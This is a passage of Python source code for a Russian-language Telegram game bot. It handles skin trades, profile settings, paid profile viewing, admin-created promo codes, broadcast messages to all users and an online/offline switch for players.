                ],
                [InlineKeyboardButton("❌ Отменить", callback_data=f"exchange|cancel|{exchange_id}")]
            ])
            await context.bot.send_message(
                chat_id=int(initiator_id),
                text=f"📤 Вы предложили обмен пользователю {target_nick}. Ожидайте ответа.",
                reply_markup=keyboard
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления инициатору: {e}")

        await query.edit_message_text("✅ Запрос на обмен отправлен!")
        return

async def exchange_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    action = data[1]
    exchange_id = data[2]

    exchanges = load_exchanges()
    if exchange_id not in exchanges:
        await query.edit_message_text("❌ Обмен не найден или уже обработан")
        return
    exch = exchanges[exchange_id]

    if action == "info":
        _, initiator_item = get_item_owner(exch['initiator_skin_id'])
        _, target_item = get_item_owner(exch['target_skin_id'])
        text = "♻️ Информация об обмене:\n\n"
        text += "🔹 Предлагает:\n"
        text += format_item_info(initiator_item)
        text += "\n🔸 Просит:\n"
        text += format_item_info(target_item)
        await query.edit_message_text(text)

    elif action == "accept":
        if str(query.from_user.id) != exch['target_id']:
            await query.edit_message_text("❌ Это не ваш обмен")
            return
        inv = load_inventory()
        initiator_id = exch['initiator_id']
        target_id = exch['target_id']
        initiator_skin = None
        target_skin = None
        for tid, items in inv.items():
            if tid == initiator_id:
                for it in items:
                    if it.get('id') == exch['initiator_skin_id']:
                        initiator_skin = it
                        break
            if tid == target_id:
                for it in items:
                    if it.get('id') == exch['target_skin_id']:
                        target_skin = it
                        break
        if not initiator_skin or not target_skin:
            await query.edit_message_text("❌ Один из скинов пропал")
            return
        inv[initiator_id] = [it for it in inv[initiator_id] if it.get('id') != exch['initiator_skin_id']]
        inv[target_id] = [it for it in inv[target_id] if it.get('id') != exch['target_skin_id']]
        if initiator_id not in inv:
            inv[initiator_id] = []
        if target_id not in inv:
            inv[target_id] = []
        inv[initiator_id].append(target_skin)
        inv[target_id].append(initiator_skin)
        save_inventory(inv)

        if 'notification_msg_id' in exch:
            try:
                await context.bot.send_message(
                    chat_id=TRADE_VIRTUAL_CHAT,
                    text=(
                        f"✅ Трейд принят!\n"
                        f"❗ Время принятия: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    ),
                    message_thread_id=TRADE_VIRTUAL_THREAD,
                    reply_to_message_id=exch['notification_msg_id']
                )
            except Exception as e:
                logger.error(f"Не удалось ответить на сообщение о трейде: {e}")

        del exchanges[exchange_id]
        save_exchanges(exchanges)
        await query.edit_message_text("✅ Обмен совершён!")
        try:
            await context.bot.send_message(chat_id=int(initiator_id), text="✅ Ваш обмен принят!")
        except Exception as e:
            logger.error(f"Не удалось уведомить инициатора: {e}")

    elif action == "decline":
        if str(query.from_user.id) != exch['target_id']:
            await query.edit_message_text("❌ Это не ваш обмен")
            return
        del exchanges[exchange_id]
        save_exchanges(exchanges)
        await query.edit_message_text("❌ Обмен отклонён")
        try:
            await context.bot.send_message(chat_id=int(exch['initiator_id']), text="❌ Ваш обмен отклонили")
        except Exception as e:
            logger.error(f"Не удалось уведомить инициатора: {e}")

    elif action == "cancel":
        if str(query.from_user.id) != exch['initiator_id']:
            await query.edit_message_text("❌ Это не ваш обмен")
            return
        del exchanges[exchange_id]
        save_exchanges(exchanges)
        await query.edit_message_text("❌ Обмен отменён")

def format_item_info(item):
    if not item:
        return "Предмет не найден\n"
    skin_name = get_skin_name(item['skin_code'])
    mod_name = get_modifier_name(item['modifier'])
    stickers = item.get('stickers', [])
    text = f"{skin_name} - {mod_name}\n"
    if stickers:
        text += "Наклейки:\n"
        for s in stickers:
            st_name = get_sticker_name(s['code'])
            text += f"  Слот {s['slot']}: {st_name}\n"
    else:
        text += "Наклеек нет\n"
    return text

# ============= НАСТРОЙКИ =============
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("👥 Друзья"), KeyboardButton("🔄 Трейды")],
        [KeyboardButton("⚙️ Профиль")],
        [KeyboardButton("◀️ Назад в профиль")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("⚙️ Настройки", reply_markup=reply_markup)

async def settings_friends(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    players = load_json(PLAYERS_FILE, {})
    if 'allow_friend_requests' not in players[user_id]:
        players[user_id]['allow_friend_requests'] = True
        save_json(PLAYERS_FILE, players)
    allow = players[user_id]['allow_friend_requests']
    text = f"👥 Настройка друзей\n\n• Принимать ли запросы в друзья?\nТекущий статус: {'✅ Да' if allow else '❌ Нет'}"
    keyboard = [[InlineKeyboardButton("✅ Да" if allow else "❌ Нет", callback_data="toggle_friend_requests")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def settings_trades(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    players = load_json(PLAYERS_FILE, {})
    if 'accept_trades' not in players[user_id]:
        players[user_id]['accept_trades'] = True
        save_json(PLAYERS_FILE, players)
    accept = players[user_id]['accept_trades']
    text = f"🔄 Настройка трейдов\n\n• Принимать ли предложения обменов в боте?\nТекущий статус: {'✅ Да' if accept else '❌ Нет'}"
    keyboard = [[InlineKeyboardButton("✅ Да" if accept else "❌ Нет", callback_data="toggle_accept_trades")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def settings_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    players = load_json(PLAYERS_FILE, {})
    if 'profile_view_cost' not in players[user_id]:
        players[user_id]['profile_view_cost'] = 10
        save_json(PLAYERS_FILE, players)
    cost = players[user_id]['profile_view_cost']
    text = f"⚙️ Настройка профиля\n\n• Стоимость просмотра вашего профиля другими пользователями: {cost} токенов.\nИзменить стоимость?"
    keyboard = [
        [InlineKeyboardButton("➕ Увеличить на 5", callback_data="profile_cost_inc")],
        [InlineKeyboardButton("➖ Уменьшить на 5", callback_data="profile_cost_dec")],
        [InlineKeyboardButton("✅ Готово", callback_data="profile_cost_done")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def toggle_friend_requests_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    players = load_json(PLAYERS_FILE, {})
    current = players[user_id].get('allow_friend_requests', True)
    players[user_id]['allow_friend_requests'] = not current
    save_json(PLAYERS_FILE, players)
    new_status = '✅ Да' if not current else '❌ Нет'
    try:
        await query.edit_message_text(
            f"👥 Настройка друзей\n\n• Принимать ли запросы в друзья?\nТекущий статус: {new_status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(new_status, callback_data="toggle_friend_requests")]])
        )
    except Exception as e:
        logger.error(f"Ошибка в toggle_friend_requests: {e}")

async def toggle_accept_trades_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    players = load_json(PLAYERS_FILE, {})
    current = players[user_id].get('accept_trades', True)
    players[user_id]['accept_trades'] = not current
    save_json(PLAYERS_FILE, players)
    new_status = '✅ Да' if not current else '❌ Нет'
    try:
        await query.edit_message_text(
            f"🔄 Настройка трейдов\n\n• Принимать ли предложения обменов в боте?\nТекущий статус: {new_status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(new_status, callback_data="toggle_accept_trades")]])
        )
    except Exception as e:
        logger.error(f"Ошибка в toggle_accept_trades: {e}")

async def profile_cost_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    players = load_json(PLAYERS_FILE, {})
    cost = players[user_id].get('profile_view_cost', 10)
    if query.data == "profile_cost_inc":
        cost += 5
    elif query.data == "profile_cost_dec":
        cost = max(0, cost - 5)
    elif query.data == "profile_cost_done":
        await query.edit_message_text(f"✅ Стоимость просмотра установлена: {cost} токенов.")
        return
    players[user_id]['profile_view_cost'] = cost
    save_json(PLAYERS_FILE, players)
    try:
        await query.edit_message_text(
            f"⚙️ Настройка профиля\n\n• Стоимость просмотра вашего профиля другими пользователями: {cost} токенов.\nИзменить стоимость?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ Увеличить на 5", callback_data="profile_cost_inc")],
                [InlineKeyboardButton("➖ Уменьшить на 5", callback_data="profile_cost_dec")],
                [InlineKeyboardButton("✅ Готово", callback_data="profile_cost_done")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка в profile_cost: {e}")

# ============= ПРОСМОТР ЧУЖОГО ПРОФИЛЯ =============
async def view_other_profile_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    awaiting_view_profile[update.effective_user.id] = True
    await update.message.reply_text("Введите ник игрока, чей профиль хотите посмотреть:")

async def handle_view_other_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in awaiting_view_profile:
        return False
    target_nick = update.message.text.strip()
    del awaiting_view_profile[user_id]

    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return True

    target_data = players[target_id]
    cost = target_data.get('profile_view_cost', 10)
    viewer_data = players.get(str(user_id), {})
    if viewer_data.get('tokens', 0) < cost:
        await update.message.reply_text(f"❌ У вас недостаточно токенов. Нужно {cost} токенов.")
        return True

    players[str(user_id)]['tokens'] = viewer_data.get('tokens', 0) - cost
    save_json(PLAYERS_FILE, players)

    nick_emoji = "🗨️"
    role_emoji = "👑"
    time_emoji = "🕓"
    coins_emoji = "💰"
    tokens_emoji = "💎"
    friends_emoji = "🧟"
    referral_emoji = "⚡"

    text = (
        f"👤 Профиль игрока {target_nick}\n"
        f"{nick_emoji} Никнейм в игре: {target_data.get('game_nick', 'неизвестно')}\n"
        f"{role_emoji} Роль: {'Игрок' if target_data.get('role')=='user' else 'Администратор'}\n"
        f"{time_emoji} Дата регистрации: {target_data.get('registered_at', 'неизвестно')}\n"
        f"{coins_emoji} Монеты: {format_coins(target_data.get('coins', 0))}\n"
        f"{tokens_emoji} Токены: {target_data.get('tokens', 0)}\n"
        f"{friends_emoji} Друзей: {len(target_data.get('friends', []))}\n"
        f"{referral_emoji} Рефералов: {target_data.get('referral_count', 0)}"
    )
    await update.message.reply_text(text)
    return True

# ============= ПРОМОКОДЫ =============
async def promo_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("✅ Активировать промокод")],
        [KeyboardButton("📜 Мои активации")],
        [KeyboardButton("◀️ Назад в профиль")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🎫 Промокоды", reply_markup=reply_markup)

async def activate_promo_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    awaiting_activate_promo[update.effective_user.id] = True
    await update.message.reply_text("Введите код промокода:")

async def handle_activate_promo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in awaiting_activate_promo:
        return False
    code = update.message.text.strip().upper()
    del awaiting_activate_promo[user_id]

    promos = load_promocodes()
    if code not in promos:
        await update.message.reply_text("❌ Промокод не найден")
        return True

    promo = promos[code]
    now = datetime.now()
    expires = datetime.fromisoformat(promo['expires_at'])
    if now > expires:
        await update.message.reply_text("❌ Срок действия промокода истёк")
        await update_promo_message(context.bot, code, promo)
        return True

    if promo['used_count'] >= promo['max_uses']:
        await update.message.reply_text("❌ Промокод уже использован максимальное количество раз")
        await update_promo_message(context.bot, code, promo)
        return True

    rewards = promo.get('rewards', [])
    if not rewards and 'reward' in promo:
        rewards = [promo['reward']]

    user_id_str = str(user_id)
    players = load_json(PLAYERS_FILE, {})
    coins_given = 0
    tokens_given = 0
    skins_given = 0

    for reward in rewards:
        if reward['type'] == 'coins':
            players[user_id_str]['coins'] = players[user_id_str].get('coins', 0) + reward['amount']
            coins_given += reward['amount']
        elif reward['type'] == 'tokens':
            players[user_id_str]['tokens'] = players[user_id_str].get('tokens', 0) + reward['amount']
            tokens_given += reward['amount']
        elif reward['type'] == 'skins':
            for item_data in reward['items']:
                add_item_to_inventory(user_id_str, item_data)
                skins_given += 1

    save_json(PLAYERS_FILE, players)

    parts = []
    if coins_given:
        parts.append(f"{coins_given} монет")
    if tokens_given:
        parts.append(f"{tokens_given} токенов")
    if skins_given:
        parts.append(f"{skins_given} скинов")
    reward_text = ", ".join(parts)

    promo['used_count'] += 1
    save_promocodes(promos)
    await update_promo_message(context.bot, code, promo)
    await update.message.reply_text(f"✅ Промокод активирован! Вы получили: {reward_text}.")
    return True

async def update_promo_message(bot, code: str, promo: dict):
    if 'message_id' not in promo or 'chat_id' not in promo:
        return
    try:
        new_text = format_promo_info(promo, for_channel=True)
        await bot.edit_message_text(
            chat_id=promo['chat_id'],
            message_id=promo['message_id'],
            text=new_text
        )
    except Exception as e:
        logger.error(f"Ошибка обновления сообщения промокода {code}: {e}")

# ============= КОМАНДЫ ДЛЯ АДМИНОВ (ПРОМОКОДЫ) =============
async def promo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "Использование:\n"
            "/promo create <название> - создать промокод\n"
            "/promo delete <название> - удалить промокод\n"
            "/promo status <название> - информация о промокоде\n"
            "/promo list - список всех промокодов"
        )
        return
    subcmd = args[0].lower()
    if subcmd == "create" and len(args) >= 2:
        name = args[1].upper()
        await promo_create_start(update, context, name)
    elif subcmd == "delete" and len(args) >= 2:
        name = args[1].upper()
        await promo_delete(update, context, name)
    elif subcmd == "status" and len(args) >= 2:
        name = args[1].upper()
        await promo_status(update, context, name)
    elif subcmd == "list":
        await promo_list(update, context)
    else:
        await update.message.reply_text("Неверная подкоманда")

async def promo_create_start(update: Update, context: ContextTypes.DEFAULT_TYPE, name: str):
    promos = load_promocodes()
    if name in promos:
        await update.message.reply_text("❌ Промокод с таким названием уже существует")
        return
    context.user_data['promo_creating'] = {
        'name': name,
        'expires_at': None,
        'max_uses': None,
        'rewards': []
    }
    await show_promo_edit_menu(update, context)

async def show_promo_edit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = context.user_data['promo_creating']
    text = "⚙️ Настройка промокода\n\n"
    text += f"Название: {data['name']}\n"
    text += f"Время действия: {data['expires_at'] or 'не задано'}\n"
    text += f"Макс. использований: {data['max_uses'] or 'не задано'}\n"
    text += f"Награды:\n"
    if data['rewards']:
        for r in data['rewards']:
            if r['type'] == 'coins':
                text += f"  - 💰 Монеты: {r['amount']}\n"
            elif r['type'] == 'tokens':
                text += f"  - 💎 Токены: {r['amount']}\n"
            elif r['type'] == 'skins':
                text += f"  - 🔫 Скины: {len(r['items'])} шт.\n"
    else:
        text += "  не заданы\n"
    text += "\nВыберите действие:"

    keyboard = [
        [KeyboardButton("⏱ Время промокода"), KeyboardButton("🔢 Количество использований")],
        [KeyboardButton("💰 Монеты"), KeyboardButton("💎 Токены")],
        [KeyboardButton("🔫 Скины")],
        [KeyboardButton("✅ Готово")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def promo_set_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Введите время действия промокода (например: 1д, 2ч, 30мин, 1мес)\n"
        "Или выберите из предложенных вариантов:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("1 мин", callback_data="promo_time_1min"),
             InlineKeyboardButton("1 час", callback_data="promo_time_1h"),
             InlineKeyboardButton("10 ч", callback_data="promo_time_10h")],
            [InlineKeyboardButton("1 день", callback_data="promo_time_1d"),
             InlineKeyboardButton("1 месяц", callback_data="promo_time_1mo")]
        ])
    )
    context.user_data['awaiting_promo_time'] = True

async def promo_set_uses(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Введите максимальное количество использований (число)\n"
        "Или выберите из предложенных:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("1", callback_data="promo_uses_1"),
             InlineKeyboardButton("5", callback_data="promo_uses_5"),
             InlineKeyboardButton("10", callback_data="promo_uses_10")],
            [InlineKeyboardButton("20", callback_data="promo_uses_20"),
             InlineKeyboardButton("50", callback_data="promo_uses_50")]
        ])
    )
    context.user_data['awaiting_promo_uses'] = True

async def promo_time_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    now = datetime.now()
    if data == "promo_time_1min":
        expires = now + timedelta(minutes=1)
    elif data == "promo_time_1h":
        expires = now + timedelta(hours=1)
    elif data == "promo_time_10h":
        expires = now + timedelta(hours=10)
    elif data == "promo_time_1d":
        expires = now + timedelta(days=1)
    elif data == "promo_time_1mo":
        expires = now + timedelta(days=30)
    else:
        return
    context.user_data['promo_creating']['expires_at'] = expires.isoformat()
    await query.edit_message_text(f"✅ Время установлено: {expires.strftime('%Y-%m-%d %H:%M:%S')}")
    await show_promo_edit_menu(update, context)

async def promo_uses_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uses = int(data.split('_')[-1])
    context.user_data['promo_creating']['max_uses'] = uses
    await query.edit_message_text(f"✅ Максимальное количество использований: {uses}")
    await show_promo_edit_menu(update, context)

async def promo_set_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Введите количество монет:")
    context.user_data['awaiting_promo_coins'] = True

async def promo_set_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Введите количество токенов:")
    context.user_data['awaiting_promo_tokens'] = True

async def promo_set_skins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Введите скины в формате, как при /skin add (через запятую).\n"
        "Например: ES44, ES44$Yo0$Yk1$Xf2"
    )
    context.user_data['awaiting_promo_skins'] = True

async def promo_create_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = context.user_data.get('promo_creating')
    if not data:
        await update.message.reply_text("Ошибка: нет данных промокода")
        return
    if not data['expires_at'] or not data['max_uses']:
        await update.message.reply_text("❌ Заполните все обязательные параметры (время и количество использований) перед созданием")
        return
    if not data['rewards']:
        await update.message.reply_text("❌ Добавьте хотя бы одну награду")
        return

    promos = load_promocodes()
    promo_entry = {
        'name': data['name'],
        'created_at': datetime.now().isoformat(),
        'expires_at': data['expires_at'],
        'max_uses': data['max_uses'],
        'used_count': 0,
        'rewards': data['rewards'],
        'created_by': update.effective_user.id
    }
    promos[data['name']] = promo_entry
    save_promocodes(promos)

    channel_text = format_promo_info(promo_entry, for_channel=True)
    try:
        sent = await context.bot.send_message(
            chat_id=PROMO_CHANNEL,
            text=channel_text
        )
        promo_entry['message_id'] = sent.message_id
        promo_entry['chat_id'] = sent.chat.id
        save_promocodes(promos)
    except Exception as e:
        logger.error(f"Ошибка отправки в канал: {e}")

    await update.message.reply_text("✅ Промокод успешно создан!")
    del context.user_data['promo_creating']

    await show_user_profile(update, context)

def format_promo_info(promo, for_channel=False):
    expires = datetime.fromisoformat(promo['expires_at'])
    now = datetime.now()
    active = (now <= expires and promo['used_count'] < promo['max_uses'])
    status_text = "✅ Активен" if active else "⛔ Неактивен"

    text = (
        "«=============================»\n"
        "♻️ Промокод успешно сделан!\n"
        f"- Название промокода: {promo['name']}\n"
        f"- Время промокода: {expires.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"- Количество использований: {promo['used_count']}/{promo['max_uses']}\n"
    )

    rewards = promo.get('rewards', [])
    if not rewards and 'reward' in promo:
        rewards = [promo['reward']]

    coin_total = 0
    token_total = 0
    skin_items = []

    for r in rewards:
        if r['type'] == 'coins':
            coin_total += r['amount']
        elif r['type'] == 'tokens':
            token_total += r['amount']
        elif r['type'] == 'skins':
            skin_items.extend(r['items'])

    if coin_total:
        text += f"- 💎 Монеты: {coin_total}\n"
    if token_total:
        text += f"- 💎 Токены: {token_total}\n"

    if skin_items:
        text += "- 🔫 Скины ⤵\n"
        for item in skin_items:
            skin_name = get_skin_name(item['skin_code'])
            mod_name = get_modifier_name(item['modifier'])
            text += f"  🍪 {skin_name} - {mod_name}\n"
            if item.get('stickers'):
                text += "    Наклейки ⤵\n"
                for i in range(4):
                    sticker = next((s for s in item['stickers'] if s['slot'] == i), None)
                    if sticker:
                        st_name = get_sticker_name(sticker['code'])
                        text += f"    {i+1}. {st_name}\n"
                    else:
                        text += f"    {i+1}. ❌ Нету\n"
    else:
        text += "- 🔫 Скины: нет\n"

    text += (
        "\nКак использовать промокод?\n"
        "Использовать в боте @EfezGame_bot\n"
        "После регистрации в разделе\n"
        "| Промокоды |\n"
        f"{status_text}\n"
        "«=============================»"
    )
    return text

async def promo_delete(update: Update, context: ContextTypes.DEFAULT_TYPE, name: str):
    promos = load_promocodes()
    if name not in promos:
        await update.message.reply_text("❌ Промокод не найден")
        return
    del promos[name]
    save_promocodes(promos)
    await update.message.reply_text(f"✅ Промокод {name} удалён")

async def promo_status(update: Update, context: ContextTypes.DEFAULT_TYPE, name: str):
    promos = load_promocodes()
    if name not in promos:
        await update.message.reply_text("❌ Промокод не найден")
        return
    promo = promos[name]
    await update.message.reply_text(format_promo_info(promo))

async def promo_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    promos = load_promocodes()
    if not promos:
        await update.message.reply_text("Нет созданных промокодов")
        return
    text = "📋 Список промокодов:\n"
    for name, promo in promos.items():
        expires = datetime.fromisoformat(promo['expires_at'])
        status = "✅" if (datetime.now() <= expires and promo['used_count'] < promo['max_uses']) else "❌"
        text += f"{status} {name} (использовано {promo['used_count']}/{promo['max_uses']}, истекает {expires.strftime('%Y-%m-%d')})\n"
    await update.message.reply_text(text)

# ============= РАССЫЛКА (BROADCAST) =============
def generate_broadcast_code():
    while True:
        code = '#' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        broadcasts = load_broadcasts()
        if code not in broadcasts:
            return code

async def everyone_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "Использование:\n"
            "/everyone <текст> - отправить сообщение всем пользователям\n"
            "/everyone delete <код> - удалить ранее отправленное сообщение\n"
            "/everyone info <код> - информация о рассылке"
        )
        return
    subcmd = args[0].lower()
    if subcmd == "delete" and len(args) >= 2:
        code = args[1].upper()
        await everyone_delete(update, context, code)
    elif subcmd == "info" and len(args) >= 2:
        code = args[1].upper()
        await everyone_info(update, context, code)
    else:
        text = ' '.join(args)
        await everyone_send(update, context, text)

async def everyone_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    code = generate_broadcast_code()
    players = load_json(PLAYERS_FILE, {})
    if not players:
        await update.message.reply_text("Нет зарегистрированных пользователей.")
        return
    sent_count = 0
    failed_count = 0
    messages = {}
    for tid in players.keys():
        try:
            sent = await context.bot.send_message(chat_id=int(tid), text=text)
            messages[tid] = sent.message_id
            sent_count += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Не удалось отправить сообщение пользователю {tid}: {e}")
            failed_count += 1
    broadcasts = load_broadcasts()
    broadcasts[code] = {
        "code": code,
        "text": text,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "created_by": update.effective_user.id,
        "messages": messages,
        "sent_count": sent_count,
        "failed_count": failed_count
    }
    save_broadcasts(broadcasts)
    await update.message.reply_text(
        f"✅ Рассылка отправлена!\n"
        f"Код: {code}\n"
        f"Успешно: {sent_count}\n"
        f"Ошибок: {failed_count}\n"
        f"Чтобы удалить это сообщение у всех, используйте:\n/everyone delete {code}"
    )

async def everyone_delete(update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
    broadcasts = load_broadcasts()
    if code not in broadcasts:
        await update.message.reply_text("❌ Рассылка с таким кодом не найдена.")
        return
    data = broadcasts[code]
    deleted = 0
    errors = 0
    for tid, msg_id in data['messages'].items():
        try:
            await context.bot.delete_message(chat_id=int(tid), message_id=msg_id)
            deleted += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Не удалось удалить сообщение у {tid}: {e}")
            errors += 1
    del broadcasts[code]
    save_broadcasts(broadcasts)
    await update.message.reply_text(
        f"✅ Рассылка {code} удалена.\n"
        f"Удалено сообщений: {deleted}\n"
        f"Ошибок: {errors}"
    )

async def everyone_info(update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
    broadcasts = load_broadcasts()
    if code not in broadcasts:
        await update.message.reply_text("❌ Рассылка с таким кодом не найдена.")
        return
    data = broadcasts[code]
    text = (
        f"📋 Информация о рассылке {code}\n"
        f"📅 Дата: {data['created_at']}\n"
        f"👤 Отправитель: {data['created_by']}\n"
        f"📊 Отправлено: {data['sent_count']}, ошибок: {data['failed_count']}\n"
        f"📝 Текст:\n{data['text']}"
    )
    await update.message.reply_text(text)

# ============= ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ =============
@require_registration
@check_ban


def build_user_profile_text_and_markup(user_id: str):
    players = load_json(PLAYERS_FILE, {})
    pdata = players.get(user_id, {})
    coins = pdata.get('coins', 0)
    tokens = pdata.get('tokens', 0)
    coins_str = format_coins(coins)
    tokens_str = str(tokens)
    friends_count = len(pdata.get('friends', []))
    referral_count = pdata.get('referral_count', 0)
    role = pdata.get('role', 'user')
    role_display = "Игрок" if role == "user" else ("Администратор" if role == "admin" else "Владелец")
    reg_time = pdata.get('registered_at', 'неизвестно')

    line = "=" * 30
    text = (
        f"👤 Ваш профиль ⤵︎\n"
        f"{line}\n"
        f"- 🗨️ Никнейм в игре: {pdata.get('game_nick', 'неизвестно')}\n"
        f"- 👑 Роль: {role_display}\n"
        f"- 🕓 Время регистрации: {reg_time}\n"
        f"- 💰 Монеты: {coins_str}\n"
        f"- 💎 Токены: {tokens_str}\n"
        f"- 🧟 Друзей: {friends_count}\n"
        f"- ⚡ Рефералов: {referral_count}\n"
        f"{line}"
    )

    keyboard = [
        [KeyboardButton("👤 Профиль"), KeyboardButton("🍪 Инвентарь")],
        [KeyboardButton("👥 Друзья"), KeyboardButton("🔄 Обмены")],
        [KeyboardButton("⚙️ Настройки"), KeyboardButton("🎫 Промокоды")],
        [KeyboardButton("🔍 Посмотреть чужой профиль")],
        [KeyboardButton("⚡ Реферальная система")]
    ]
    if is_admin_or_owner(int(user_id)):
        keyboard.append([KeyboardButton("◀️ Назад")])

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    return text, reply_markup

async def show_user_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text, reply_markup = build_user_profile_text_and_markup(user_id)
    if update.callback_query:
        await context.bot.send_message(chat_id=update.callback_query.from_user.id, text=text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)
    update_player_stats(int(user_id))

# ============= КОМАНДЫ УПРАВЛЕНИЯ БОТОМ (OFFLINE/ONLINE) =============
async def bot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Использование:\n/bot offline - выключить бота для игроков\n/bot online - включить бота для игроков\n/bot status - статистика регистраций за сегодня")
        return
    subcmd = args[0].lower()
    if subcmd == "offline":
        global bot_online
        bot_online = False
        await update.message.reply_text("✅ Бот переведён в режим офлайн для игроков. Администраторы и владелец имеют доступ.")
    elif subcmd == "online":
        bot_online = True
        await update.message.reply_text("✅ Бот снова доступен для всех игроков.")
    elif subcmd == "status":
        players = load_json(PLAYERS_FILE, {})
        today = datetime.now().date()
        count = 0
        for p in players.values():
            reg = p.get('registered_at')
            if reg:
                try:
                    reg_date = datetime.fromisoformat(reg).date()
                    if reg_date == today:
                        count += 1
                except:
                    pass
        await update.message.reply_text(f"📊 За сегодня зарегистрировалось игроков: {count}")
    else:
        await update.message.reply_text("Неизвестная подкоманда. Используйте /bot offline /bot online /bot status")

# ============= ОБРАБОТЧИК REPLY КЛАВИАТУРЫ =============
async def handle_reply_keyboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if context.user_data.get('in_settings'):
        if text == "👥 Друзья":
            await settings_friends(update, context)
            return
        elif text == "🔄 Трейды":
            await settings_trades(update, context)
            return
        elif text == "⚙️ Профиль":
            await settings_profile(update, context)
            return
        elif text == "◀️ Назад в профиль":
            context.user_data['in_settings'] = False
            await show_user_profile(update, context)
            return

    if context.user_data.get('promo_creating'):
        if text == "⏱ Время промокода":
            await promo_set_time(update, context)
        elif text == "🔢 Количество использований":
            await promo_set_uses(update, context)
        elif text == "💰 Монеты":
            await promo_set_coins(update, context)
        elif text == "💎 Токены":
            await promo_set_tokens(update, context)
        elif text == "🔫 Скины":
            await promo_set_skins(update, context)
        elif text == "✅ Готово":
            await promo_create_final(update, context)
        return

    # Обработка кнопки вывода скина
    if text == "✅ ВЫВЕСТИ СКИН" and user_id in awaiting_withdraw_skin:
        item_id = awaiting_withdraw_skin.pop(user_id)
        await withdraw_skin(user_id, item_id, context)
        return

    # Кнопки навигации
    if text == "◀️ Назад в профиль":
        await show_user_profile(update, context)
        return
    elif text == "◀️ Назад к другу":
        friend_nick = context.user_data.get('last_friend_nick')
        if friend_nick:
            await friend_profile_by_link(friend_nick, user_id, context)
        else:
            await show_user_profile(update, context)
        return
